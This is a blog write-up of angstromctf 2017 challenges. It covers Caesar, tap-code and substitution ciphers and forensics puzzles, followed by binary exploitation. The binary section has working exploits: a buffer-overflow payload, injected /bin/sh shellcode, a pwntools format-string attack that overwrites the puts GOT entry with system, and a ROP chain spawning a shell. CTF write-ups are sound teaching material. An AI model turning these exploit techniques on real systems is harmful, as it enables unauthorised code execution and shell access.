---
layout: post
title: "angstromctf 2017"
categories: exploits ctf
---
* TOC
{:toc}

# CRYPTO, 10 [THE BEGINNING]

```python
#!/usr/bin/env python

from string import ascii_lowercase, ascii_uppercase, maketrans
from sys import argv

secret = argv[1]

def caesar(plaintext, shift):
    alphabet = ascii_lowercase + ascii_uppercase
    shifted_lower = ascii_lowercase[shift:] + ascii_lowercase[:shift]
    shifted_upper = ascii_uppercase[shift:] + ascii_uppercase[:shift]
    shifted_alphabet = shifted_lower + shifted_upper

    table = maketrans(alphabet, shifted_alphabet)
    return plaintext.translate(table)

for i in range(26):
        print i, caesar(secret, i)
```

```
$ python caesar.py "Pxevhfx mh tgzlmkhfvmy. Px ahix rhn xgchr hnk vmy. tvmy{utvd_mh_max_ynmnkx}." | grep actf
7 Welcome to angstromctf. We hope you enjoy our ctf. actf{back_to_the_future}.
```

# CRYPTO, 30 [KNOCK KNOCK]

The cipher is based on the [Tap Code](https://en.wikipedia.org/wiki/Tap_code).

```python
#!/usr/bin/env python

code = "231531353215353115114315"

alphabet = "ab_defghijlmnopqrstuvwxyz"

solution = ""
for i in range(0, len(code), 2):
    j = (int(code[i]) - 1) * 5 + int(code[i+1]) - 1
    solution += alphabet[j]

print solution
```

```
$ python tap_code.py
helpmeplease
```

# CRYPTO, 50 [DESCRIPTIONS]

We have a file, where the same word represents always the same bit of information:

```
The horse was a small falcon runner.
The horse was a huge goat pitcher.
The pig is a quick falcon singer.
The goat was a quick sheep speaker.
The sheep is the big goat pitcher.
The sheep was a slow sheep hitter.
The horse is a tiny goat dancer.
A cow is the huge bluejay dancer.
The falcon is the fast sheep pitcher.
The pig was a speedy falcon pitcher.
The pig was the speedy goat singer.
The goat was a huge sheep hitter.
The horse was the speedy sheep runner.
The cow was a speedy bluejay singer.
A sheep is a small falcon catcher.
The cow was the fast cow singer.
The goat was a sluggish sheep catcher.
The goat is the slow robin catcher.
```

Solution:

```
1100001 a
1100011 c
1110100 t
1100110 f
1111011 {
1100111 g
1110010 r
0111000 8
1011111 _
1100101 e
1101110 n
1100011 c
1101111 o
1100100 d
0110001 1
1101110 n
1100111 g
1111101 }

actf{gr8_encod1ng}
```

# CRYPTO, 60 [SUBSTITUTION CIPHER]

Using [quipqiup](http://quipqiup.com/) or [Substitution Solver](https://www.guballa.de/substitution-solver) we found:

```
youcanthandlethetruthsonweliveinaworldthathaswallsandthosewallshavetobeguardedbymenwithgunswhosgonnadoityouyoultweinbergihaveagreaterresponsibilitythanyoucanpossiblyfathomyouweepforsantiagoandyoucursethemarinesyouhavethatluxuryyouhavetheluxuryofnotknowingwhatiknowthatsantiagosdeathwhiletragicprobablysavedlivesandmyexistencewhilegrotesqueandincomprehensibletoyousaveslivesyoudontwantthetruthbecausedeepdowninplacesyoudonttalkaboutatpartiesyouwantmeonthatwallyouneedmeonthatwallweusewordslikehonorcodeloyaltyweusethesewordsasthebackbonetoalifespentdefendingsomethingyouuseemasapunchlineihaveneitherthetimenortheinclinationtoexplainmyselftoamanwhorisesandsleepsundertheblanketoftheveryfreedomiprovidethenquestionsthemannerinwhichiprovideitidratheryoujustsaidthankyouandwentonyourwayotherwiseisuggestyoupickupaweaponandstandaposteitherwayidontgiveadamnwhatyouthinkyoureentitledto{fewgoodmenjessep}
```

Solution:

```text
{fewgoodmenjessep}
```

# FORENSICS, 30 [USB ENCRYPTION]

```
$ hdiutil attach DEFUND.dmg
$ find /Volumes/DEFUND/ -iname \*flag.txt -exec cat {} \;
actf{not_quite_usb_encryption}
$ hdiutil detach /Volumes/DEFUND/
```

# FORENSICS, 50 [IMAGE TRICKERY]

First part encodes the QR code, which gives us the url below.

```python
#!/usr/bin/env python

from PIL import Image
from subprocess import call

img = Image.open('mystery.png')
img = img.convert("RGB")

pix = img.load()
x_size, y_size = img.size[0], img.size[1]

white =  (255, 255, 255)
black =  (255, 255, 254)

def process():
  for y in range(y_size):
    for x in range(x_size):
      if pix[x, y] == black:
        pix[x, y] = (0, 0, 0)
      else:
        pix[x, y] = (255, 255, 255)

process()
img.save("mystery-qr.png")
```

```
$ wget https://pastebin.com/raw/S9De6WYA
$ base64 -d S9De6WYA > decoded
```

The `decode` file contains `svg` image with the solution:

```
actf{fa1L_F15H}
```

# FORENSICS, 60 [DOCUMENT]

We have a corrupted zip file (docx document), which could be easily extracted with `binwalk`:

```
$ binwalk -e essay.docx
$ egrep -oirn "actf{.*" _essay.docx.extracted/
_essay.docx.extracted//word/document2.xml:1:actf{too_bad_for_zip_recovery</w:t></w:r><w:r w:rsidRPr="59E6A5D5" w:rsidR="59E6A5D5"><w:rPr><w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman" w:cs="Times New Roman" /><w:sz w:val="24" /><w:szCs w:val="24" /></w:rPr><w:t>}</w:t></w:r></w:p><w:sectPr><w:pgSz w:w="12240" w:h="15840" w:orient="portrait" /><w:pgMar w:top="1440" w:right="1440" w:bottom="1440" w:left="1440" w:header="720" w:footer="720" w:gutter="0" /><w:cols w:space="720" /><w:docGrid w:linePitch="360" /></w:sectPr></w:body></w:document>
```

Solution:

```
actf{too_bad_for_zip_recovery}
```

# FORENSICS, 100 [HEADPHONES]

We extracted the raw bytes from usb dump and played it as a headless audio file.

```
$ tshark -T fields -e usb.iso.data -r headphones.pcap 'usb.src == "host" && usb.function == 10' | sed 's#[:,]##g' | tr -d '\n' > raw.txt
```

```
$ python
>>> binary = open("raw.txt").read().decode("hex")
>>> f = open("binary.raw", "wb")
>>> f.write(binary)
>>> f.close()
```

```
$ play -r 44100 -b 16 -c 1 -e signed-integer ccc.raw
```

Solution: `actf{e392157ea599c605b6d483042ff8d9fe}`.

References:

[https://www.wireshark.org/docs/dfref/u/usb.html](https://www.wireshark.org/docs/dfref/u/usb.html)

# BINARY, 50 [RUNNING IN CIRCLES]

Exploit:

```
team298928@shellserver:/problems/running_in_circles$ python -c 'from struct import pack; print "-300\n"+"255\n"+"A"*132+pack("Q",0x0000000000400806)' > /dev/shm/ric_payload.txt

team298928@shellserver:/problems/running_in_circles$ (cat /dev/shm/ric_payload.txt ; echo "cat flag.txt") | ./run_circles
Welcome to the circular buffer manager:

How many bytes? Enter your data:
How many bytes? Enter your data: $ actf{you_dont_just_go_around_a_circle_once}
$
Segmentation fault (core dumped)
```

# BINARY, 80 [ART OF THE SHELL]

Exploit:

```
# 0x0000000000400565 : jmp rax

$ /problems/art_of_the_shell/art_of_the_shell $(python -c 'from struct import pack; sz = 72; sc = \
"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"; \
buf = sc + "A" * (sz-len(sc)) + pack("Q", 0x0000000000400565); print(buf)')

$ cat /problems/art_of_the_shell/flag.txt
actf{shouldve_used_the_nx_bit}
```

References:

[http://shell-storm.org/shellcode/files/shellcode-806.php](http://shell-storm.org/shellcode/files/shellcode-806.php)

# BINARY, 140 [TO-DO LIST]

There is a format string vulnerability in the `view_list()` function:

```c
void view_list()
{
        char list_name[16];
        if (!read_list_name(list_name)) return;

        FILE *fp = fopen(list_name, "r");
        if (!fp)
        {
                printf("Error opening list\n");
                return;
        }

        char item[ITEM_LENGTH];
        while (readline(item, ITEM_LENGTH, fp))
        {
                printf(item);
                printf("\n");
        }

        fclose(fp);
}
```

Exploit:

```python
#!/usr/bin/env python

from pwn import *
from sys import argv

# To debug:
# socat -v tcp-l:3000,reuseaddr,fork exec:"./todo_list"
# gdb ./todo_list --pid=$(pgrep todo_list)

CREATE = "c"
VIEW   = "v"
ADD    = "a"
DELETE = "d"
SHOW   = "s"
CHANGE = "p"
LOGIN  = "l"
HELP   = "h"
EXIT   = "x"

def create_or_log_in_user(username, password):
  x.recvuntil('Enter username: ')
  x.sendline(username)
  x.sendline(password)
  x.recvuntil('> ')

def create_and_view_list(name, content):
  x.sendline(ADD)
  x.recvuntil('Enter the name of the list: ')
  x.sendline(name)
  x.sendline(content)
  x.sendline('')
  x.recvuntil('> ')

  x.sendline(VIEW)
  x.recvuntil('Enter the name of the list: ')
  x.sendline(name)
  entry = x.recvline()
  x.recvuntil('> ')
  return entry

def delete_lists(lists):
  for l in lists:
    x.sendline(DELETE)
    x.recvuntil('Enter the name of the list: ')
    x.sendline(l)
    x.recvuntil('> ')

def format_write(what, where):
  bb = [ (int(hex(what)[2:].zfill(16)[i:i+2], 16)+256) for i in range(0,16,2) ][::-1]
  print bb
  for i in range(0, 8):
    format_string = "%8$" + str(bb[i]) + "x%8$n"
    leak = create_and_view_list(p64(where+i), format_string)

if __name__ == "__main__":

  if len(argv) > 1:
    x = remote('127.0.0.1', argv[1])
    # context.log_level = 'debug'
    libc = ELF('/lib/x86_64-linux-gnu/libc-2.24.so')
    offset_libc_start_main = -0xf1
    log.info("PID to attach: %d" % util.proc.pidof(x)[0])
  else:
    x = remote('shell.angstromctf.com', '9000')
    libc = ELF('./libc-2.23.so')
    offset_libc_start_main = -0xf0

  create_or_log_in_user('user1337', 'user1337')

  working_lists = ['list1', 'sh']
  delete_lists(working_lists)
  
  # leak "__libc_start_main" address
  format_string = "%29$p"
  LEAK_libc_start_main = int(create_and_view_list('list1', format_string)[:-1], 16) + offset_libc_start_main
  libc.address = LEAK_libc_start_main - libc.symbols['__libc_start_main']
  log.info("Libc base address: " + hex(libc.address))

  # overwrite puts() with system()
  GOT_puts = 0x602038
  system_address = libc.symbols['system']
  create_and_view_list('sh', "--")
  format_write(system_address, GOT_puts)
  
  # run shell
  x.sendline(SHOW)
  x.interactive()
```

```
$ python todo_list_exploit.py
[+] Opening connection to shell.angstromctf.com on port 9000: Done
[*] '/root/share/actf/list/libc-2.23.so'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] Libc base address: 0x7ff5ba84e000
[400, 307, 393, 442, 501, 383, 256, 256]
[*] Switching to interactive mode
$ cat ../flag.txt
actf{oh_crap_we_actually_have_to_pay_you}
```

# BINARY, 150 [NO LIBC FOR YOU]

We created a ROP chain using [ROPgadget](http://shell-storm.org/blog/Return-Oriented-Programming-and-ROPgadget-tool/) and slightly modified to match the process uid (1003). Calling `setresuid(geteuid, geteuid, geteuid)` would be more general, but it takes more typing and in this case, it does not really matter.

```python
#!/usr/bin/env python2

from pwn import *
from sys import stdout

uid = 1003

# Padding goes here
p = 'X' * 72

# setresuid(uid, uid, uid)
p += p64(0x00000000004014c6) # pop rdi ; ret
p += p64(uid)
p += p64(0x00000000004015e7) # pop rsi ; ret
p += p64(uid)
p += p64(0x0000000000441d06) # pop rdx ; ret
p += p64(uid)
p += p64(0x000000000042550f) # xor rax, rax ; ret
p += p64(0x0000000000465b90) * 117 # add rax, 1 ; ret
p += p64(0x00000000004666d5) # syscall ; ret

p += p64(0x00000000004015e7) # pop rsi ; ret
p += p64(0x00000000006c9080) # @ .data

# execve("/bin/sh")
p += p64(0x00000000004015e7) # pop rsi ; ret
p += p64(0x00000000006c9080) # @ .data
p += p64(0x0000000000477a36) # pop rax ; pop rdx ; pop rbx ; ret
p += '/bin//sh'
p += p64(0x4141414141414141) # padding
p += p64(0x4141414141414141) # padding
p += p64(0x00000000004734e1) # mov qword ptr [rsi], rax ; ret
p += p64(0x00000000004015e7) # pop rsi ; ret
p += p64(0x00000000006c9088) # @ .data + 8
p += p64(0x000000000042550f) # xor rax, rax ; ret
p += p64(0x00000000004734e1) # mov qword ptr [rsi], rax ; ret
p += p64(0x00000000004014c6) # pop rdi ; ret
p += p64(0x00000000006c9080) # @ .data
p += p64(0x00000000004015e7) # pop rsi ; ret
p += p64(0x00000000006c9088) # @ .data + 8
p += p64(0x0000000000441d06) # pop rdx ; ret
p += p64(0x00000000006c9088) # @ .data + 8
p += p64(0x000000000042550f) # xor rax, rax ; ret
p += p64(0x0000000000465b90) * 59 # add rax, 1 ; ret
p += p64(0x00000000004666d5) # syscall ; ret

stdout.write( p ) 
```

```
(cat /dev/shm/sss.txt - ) | ./nolibc4u

You said: XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX�@
id
uid=1003(no_libc_for_you) gid=1006(ctfgroup) groups=1006(ctfgroup)
cat flag.txt
actf{ya_gotta_luv3_r0p_ch4in5}
```

References:

[https://filippo.io/linux-syscall-table/](https://filippo.io/linux-syscall-table/)